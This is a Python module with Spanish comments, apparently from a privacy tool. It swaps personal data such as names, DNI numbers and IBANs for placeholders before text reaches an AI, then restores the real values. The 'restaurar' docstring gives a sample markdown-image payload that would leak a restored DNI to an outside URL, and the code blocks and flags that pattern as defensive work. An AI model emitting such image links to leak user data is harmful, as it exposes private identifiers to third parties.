"""El escudo: tapa los datos sensibles y luego los vuelve a poner.

    "Soy Ana, mi DNI es 12345678Z"
        -> proteger ->  "Soy [PERSONA_1], mi DNI es [DNI_1]"   (esto es lo que ve la IA)
        -> la IA responde usando los marcadores
        -> restaurar -> se cambian los marcadores por los datos reales

A esta técnica se le llama SEUDONIMIZACIÓN (RGPD, art. 4.5): el dato se
cambia por un alias y la tabla para deshacerlo (la bóveda) se queda en
el PC del usuario.
"""

import re
from dataclasses import dataclass, field
from typing import Optional

from ..ia import ErrorIA
from .detectores import DetectorRegex, Hallazgo, resolver_solapes
from .validadores import solo_alfanumericos

MARCADOR = re.compile(r"\[\s*([A-Za-z_]+?_\d+)\s*\]")
# Enlaces e imágenes: destino de un enlace markdown, URL suelta o atributo src/href de HTML
ZONA_ENLACE = re.compile(r"\]\([^)]*\)|https?://\S+|(?:src|href)\s*=\s*[\"'][^\"']*[\"']", re.IGNORECASE)

# Tipos en los que "1234 5678" y "12345678" son el mismo dato
TIPOS_NUMERICOS = {"DNI", "NIE", "IBAN", "TARJETA", "TELEFONO", "MATRICULA"}


def normalizar(tipo: str, valor: str) -> str:
    if tipo in TIPOS_NUMERICOS:
        return solo_alfanumericos(valor)
    if tipo == "EMAIL":
        return valor.lower()
    return valor.strip()


class Boveda:
    """Guarda la relación marcador <-> dato real durante una conversación.

    Si el mismo DNI sale dos veces, recibe el mismo marcador, así la IA
    entiende que es la misma persona sin saber quién es.
    """

    def __init__(self):
        self._por_valor: dict[tuple[str, str], str] = {}
        self._por_marcador: dict[str, str] = {}
        self._contadores: dict[str, int] = {}

    def marcador_para(self, tipo: str, valor: str) -> str:
        clave = (tipo, normalizar(tipo, valor))
        if clave not in self._por_valor:
            self._contadores[tipo] = self._contadores.get(tipo, 0) + 1
            marcador = f"[{tipo}_{self._contadores[tipo]}]"
            self._por_valor[clave] = marcador
            self._por_marcador[marcador] = valor
        return self._por_valor[clave]

    def valor_de(self, marcador: str) -> Optional[str]:
        return self._por_marcador.get(marcador)

    def __len__(self):
        return len(self._por_marcador)

    def tabla(self) -> dict[str, str]:
        return dict(self._por_marcador)


@dataclass
class ResultadoEscudo:
    original: str
    protegido: str
    hallazgos: list[Hallazgo] = field(default_factory=list)
    avisos: list[str] = field(default_factory=list)

    def resumen(self) -> dict[str, int]:
        """Cuántos datos de cada tipo se han tapado (sin decir cuáles)."""
        cuenta: dict[str, int] = {}
        for h in self.hallazgos:
            cuenta[h.tipo] = cuenta.get(h.tipo, 0) + 1
        return cuenta


class Escudo:
    def __init__(self, detector_ia=None, tipos_ignorados=()):
        self.detector_regex = DetectorRegex(tipos_ignorados=tipos_ignorados)
        self.detector_ia = detector_ia  # None = solo expresiones regulares

    def detectar(self, texto: str) -> tuple[list[Hallazgo], list[str]]:
        hallazgos = self.detector_regex.detectar(texto)
        avisos = []
        if self.detector_ia is not None:
            try:
                hallazgos += self.detector_ia.detectar(texto)
            except ErrorIA as e:
                avisos.append(f"Detector IA no disponible, solo se usan reglas: {e}")
        return resolver_solapes(hallazgos), avisos

    def proteger(self, texto: str, boveda: Optional[Boveda] = None) -> ResultadoEscudo:
        boveda = boveda if boveda is not None else Boveda()
        hallazgos, avisos = self.detectar(texto)
        partes, ultimo = [], 0
        for h in hallazgos:  # ya vienen ordenados y sin solaparse
            partes.append(texto[ultimo:h.inicio])
            partes.append(boveda.marcador_para(h.tipo, h.valor))
            ultimo = h.fin
        partes.append(texto[ultimo:])
        return ResultadoEscudo(texto, "".join(partes), hallazgos, avisos)

    @staticmethod
    def restaurar(texto: str, boveda: Boveda, en_enlaces: bool = False) -> str:
        """Cambia cada [TIPO_N] por su dato real. Tolera '[ dni_1 ]' y similares.

        Los marcadores que la IA mete DENTRO de un enlace no se restauran: si la
        respuesta trae ![](https://web.com/?d=[DNI_1]) y se restaurara, el DNI real
        viajaría a esa web en cuanto se mostrase la imagen (robo de datos por
        exfiltración). El verificador avisa cuando pasa.
        """
        zonas = [] if en_enlaces else [m.span() for m in ZONA_ENLACE.finditer(texto)]

        def sustituir(m: re.Match) -> str:
            if any(inicio <= m.start() < fin for inicio, fin in zonas):
                return m.group(0)
            valor = boveda.valor_de(f"[{m.group(1).upper()}]")
            return valor if valor is not None else m.group(0)
        return MARCADOR.sub(sustituir, texto)

    @staticmethod
    def marcadores_en_enlaces(texto: str) -> list[str]:
        """Marcadores que aparecen dentro de enlaces o imágenes (señal de intento de exfiltración)."""
        return [m.group(0) for z in ZONA_ENLACE.finditer(texto) for m in MARCADOR.finditer(z.group(0))]
